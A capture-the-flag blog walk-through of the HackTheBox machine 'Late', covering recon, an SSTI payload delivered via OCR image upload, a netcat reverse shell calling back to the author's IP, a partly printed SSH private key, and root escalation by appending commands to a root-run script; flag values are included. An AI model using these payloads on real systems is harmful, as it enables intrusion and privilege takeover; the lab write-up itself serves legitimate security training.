---
title: "Walk-through of Late from HackTheBox"
header:
  teaser: /assets/images/2022-04-24-21-51-19.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - ImageMagick
  - SSTI
  - LinPEAS
  - PSPY64
  - chattr
  - lsattr
---

## Machine Information

![late](/assets/images/2022-04-24-21-51-19.png)

Late is rated as an easy machine on HackTheBox. The path to root is fairly simple on this box, but with a tricky to get right section where we need to create an image that is read via OCR to text. We take advantage of an SSTI vulnerability on the website on the box to get remote code execution which gives us a shell. From there we find a script is run every time an SSH login is detected, and we take advantage of an append attribute to get code execution as root and complete the box.

<!--more-->

Skills required are knowledge of server side template injections (SSTI) and enumerating to find vulnerabilities. Skills learned are image manipulation using ImageMagick and taking advantage of misconfigured attributes on files.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Late](https://www.hackthebox.com/home/machines/profile/463) |
| Machine Release Date | 23rd April 2022 |
| Date I Completed It | 26th April 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.156 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~/htb/late]
└─# nmap -p$ports -sC -sV -oA late 10.10.11.156
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-24 21:54 BST
Nmap scan report for 10.10.11.156
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
```

## Website

Only port 80 to look at for now:

![late-website](/assets/images/2022-04-24-21-56-41.png)

Nothing here, just a single static page with information about an online image editor. Further down there is a link to images.late.htb and at the bottom there's an email address with late.htb, let's add these to our host file:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# echo "10.10.11.156 late.htb images.late.htb" >> /etc/hosts
```

Now we can look at the images sub-domain:

![late-images](/assets/images/2022-04-24-22-32-34.png)

## ImageMagick

The only thing we can do here is upload an image and the Flask app converts it to text and returns it as a file. Let's test it using the ImageMagick convert utility to create our image:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# convert 
Command 'convert' not found, but can be installed with:
apt install graphicsmagick-imagemagick-compat
Do you want to install it? (N/y)y
apt install graphicsmagick-imagemagick-compat
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  ghostscript graphicsmagick gsfonts libgraphicsmagick-q16-3 libwmf-0.2-7 libwmf0.2-7 libwmflite-0.2-7
The following NEW packages will be installed:
  ghostscript graphicsmagick graphicsmagick-imagemagick-compat gsfonts libgraphicsmagick-q16-3 libwmf-0.2-7 libwmflite-0.2-7
1 upgraded, 7 newly installed, 0 to remove and 150 not upgraded.
Need to get 5,692 kB of archives.
After this operation, 13.8 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
<SNIP>
Setting up libgraphicsmagick-q16-3 (1.4+really1.3.38-1) ...
Setting up libwmf0.2-7:amd64 (0.2.12-5) ...
Setting up graphicsmagick (1.4+really1.3.38-1) ...
Setting up graphicsmagick-imagemagick-compat (1.4+really1.3.38-1) ...
Processing triggers for man-db (2.10.2-1) ...
Processing triggers for mailcap (3.70+nmu1) ...
Processing triggers for fontconfig (2.13.1-4.4) ...
Processing triggers for kali-menu (2021.4.2) ...
Processing triggers for libc-bin (2.33-6) ...
```

With that installed let's do a simple test:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# convert -size 300x100 xc:white -font Arial -pointsize 30 -fill black -gravity center -draw "text 0,0 'Hello from pencer.io'" image.png 
```

That creates a simple image with our text on it:

![late-pencer-picture](/assets/images/2022-04-24-22-52-11.png)

Go back to the images site and upload our picture. Click the Scan Image button and save the results.txt file then have a look at it's contents:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# cat /home/kali/Downloads/results.txt 
<p>Hello from pencer.io
</p>
```

## SSTI

Now we need to find a way to exploit it, and first thing I tried worked so that was nice and simple, or maybe just lucky! This flask app is vulnerable to server side template injections (SSTI). We covered this on [Bolt](https://pencer.io/ctf/ctf-htb-bolt) and also [Nunchucks](https://www.hackthebox.com/home/machines/profile/414). SSTI is well documented, with a lot of info [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) on the HackTricks site.

This is an interesting variation but the principle is the same. We can test for SSTI with a simple sum, if it's vulnerable we get the result of the sum returned. Let's create our payload image:

![late-ssti](/assets/images/2022-04-25-21-38-51.png)

When the Flask app converts that image to text we should get the result of 10*10. Let's test it by uploading that image on the site, clicking the Scan Image button and saving the results.txt file.

Looking at the result we see we have the answer of 10*10, so we know this is vulnerable:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# cat results.txt
<p>100
</p>
```

## Reverse Shell

We can use this to leak data or execute commands remotely. I spent way too long on this next bit, mostly because I couldn't get the OCR of the Flask app to read my image correctly. In the end I got this working:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# convert -size 3200x100 xc:white -font Courier -pointsize 30 -fill black -gravity center -draw "text 0,0 '{{ request.application.__globals__.__builtins__.__import__(\"os\").popen(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.158 1337 >/tmp/f | bash\").read() }}'" image.png 
```

So like before I'm creating an image with my text, I've used the builtin in function to execute a command, and I've passed a standard reverse shell to it. The resulting image looks like this:

![late-reverse-shell](/assets/images/2022-04-25-22-46-45.png)

Start netcat listening to catch the shell:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# nc -nlvp 1337                              
listening on [any] 1337 ...
```

Back to the images site, upload our new file, click on Scan Image button. If it works you will catch the shell:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# nc -nlvp 1337                              
listening on [any] 1337 ...
connect to [10.10.14.158] from (UNKNOWN) [10.10.11.156] 39690
svc_acc@late:~/app$
```

Check who we are:

```text
svc_acc@late:~/app$ id
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
```

## User Flag

Grab the user flag:

```text
svc_acc@late:~/app$ ls -ls /home
4 drwxr-xr-x 7 svc_acc svc_acc 4096 Apr  7 13:51 svc_acc

svc_acc@late:~/app$ cd /home/svc_acc

svc_acc@late:~$ ls -lsa
4 drwxrwxr-x 7 svc_acc svc_acc 4096 Apr  4 13:28 app
0 lrwxrwxrwx 1 svc_acc svc_acc    9 Jan 16 18:45 .bash_history -> /dev/null
4 -rw-r--r-- 1 svc_acc svc_acc 3771 Apr  4  2018 .bashrc
4 drwx------ 3 svc_acc svc_acc 4096 Apr  7 13:51 .cache
4 drwx------ 3 svc_acc svc_acc 4096 Jan  5 10:45 .gnupg
4 drwxrwxr-x 5 svc_acc svc_acc 4096 Jan  5 12:13 .local
4 -rw-r--r-- 1 svc_acc svc_acc  807 Apr  4  2018 .profile
4 drwx------ 2 svc_acc svc_acc 4096 Apr  7 11:08 .ssh
4 -rw-r----- 1 root    svc_acc   33 Apr 25 13:34 user.txt

svc_acc@late:~$ cat user.txt
fe6539ca01a7245dde79f192ec1130b7
```

I noticed the .ssh folder, inside there's a key pair:

```text
svc_acc@late:~$ ls -lsa .ssh
4 -rw-rw-r-- 1 svc_acc svc_acc  394 Apr  7 11:08 authorized_keys
4 -rw------- 1 svc_acc svc_acc 1679 Apr  7 11:08 id_rsa
4 -rw-r--r-- 1 svc_acc svc_acc  394 Apr  7 11:08 id_rsa.pub
```

## SSH Private Key

Grab the private key and we can drop out of this temporary shell and login via SSH:

```text
svc_acc@late:~$ cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
<SNIP>
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
```

I just copy and pasted that in to a file on Kali and changed its permissions to 600:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# cat id_rsa                               
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
<SNIP>
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

┌──(root㉿kali)-[~/htb/late]
└─# chmod 600 id_rsa
```

Now let's log back in to a proper shell:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# ssh -i id_rsa svc_acc@late.htb
svc_acc@late:~$ 
```

## LinPEAS

I grabbed [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) and copied it over:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# scp -i id_rsa linpeas.sh svc_acc@late.htb:~/               
linpeas.sh                                                 100%  758KB   1.0MB/s   00:00
```

There's one interesting thing spotted by linPEAS:

```text
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/usr/local/sbin/ssh-alert.sh

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
You own the script: /usr/local/sbin/ssh-alert.sh
```

What is this script then I wonder:

```text
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"
if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

It's a script that sends an email to root@late.htb when an ssh logon is detected.

## Pspy64

We can see it's being executed by root if we have a look with [pspy64](https://github.com/DominicBreuker/pspy). Copy pspy over to the box:

```sh
┌──(root㉿kali)-[~/htb/late]
└─# scp -i id_rsa pspy64 svc_acc@late.htb:~/ 
pspy64                      100% 3006KB 502.7KB/s   00:05
```

Make pspy64 executable and then run it:

```text
svc_acc@late:~$ chmod +x pspy64

svc_acc@late:~$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     
Config: Printing events (colored=true): processes=true | file-system-events=false |||
Scannning for processes every 100ms and on inotify events |||
Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
<SNIP>
2022/04/26 21:02:01 CMD: UID=0    PID=2344   | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 
2022/04/26 21:02:01 CMD: UID=0    PID=2346   | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh 
2022/04/26 21:02:01 CMD: UID=0    PID=2347   | rm -r /home/svc_acc/app/uploads/* 
2022/04/26 21:02:01 CMD: UID=0    PID=2349   | chattr +a /usr/local/sbin/ssh-alert.sh 
2022/04/26 21:03:01 CMD: UID=0    PID=2352   | /bin/bash /root/scripts/cron.sh 
2022/04/26 21:03:01 CMD: UID=0    PID=2351   | /bin/sh -c /root/scripts/cron.sh 
2022/04/26 21:03:01 CMD: UID=0    PID=2350   | /usr/sbin/CRON -f 
2022/04/26 21:03:01 CMD: UID=0    PID=2355   | 
2022/04/26 21:03:01 CMD: UID=0    PID=2357   | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh 
2022/04/26 21:03:01 CMD: UID=0    PID=2359   | rm -r /home/svc_acc/app/misc/* 
2022/04/26 21:03:01 CMD: UID=0    PID=2360   | chattr +a /usr/local/sbin/ssh-alert.sh 
```

## Root Flag

We can see the ssh-alert.sh script is copied from a root folder and the attributes are changed. This is happening regularly so it's safe to assume we need to find a way of manipulating the file. The chattr +a command that's run on it is setting the append attribute. [This](https://www.howtoforge.com/linux-chattr-command/) is a useful tutorial but it's simple enough.

Check attributes with lsattr:

```text
svc_acc@late:~$ lsattr -a /usr/local/sbin/ssh-alert.sh 
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

Confirms it has a lowercase **a** set which means we can append to the file. We can echo something in to that file like this:

```text
svc_acc@late:~$ echo "cp /root/root.txt /dev/shm/root.txt; chmod 777 /dev/shm/root.txt" >> /usr/local/sbin/ssh-alert.sh
```

Here I'm copying the root flag to a temporary area and changing permissions so I can read it as a user. Now I can log in to a new SSH session, the script is run and the flag is copied so I can read it:

```text
┌──(root㉿kali)-[~/htb/late]
└─# ssh -i id_rsa svc_acc@late.htb

svc_acc@late:~$ ls -lsa /dev/shm
4 -rwxrwxrwx  1 root root   33 Apr 26 21:08 root.txt

svc_acc@late:~$ cat /dev/shm/root.txt 
f98a55d412b6b72a64a84194764f9196
```

All done. That was a simple box once I got the OCR working. See you next time.
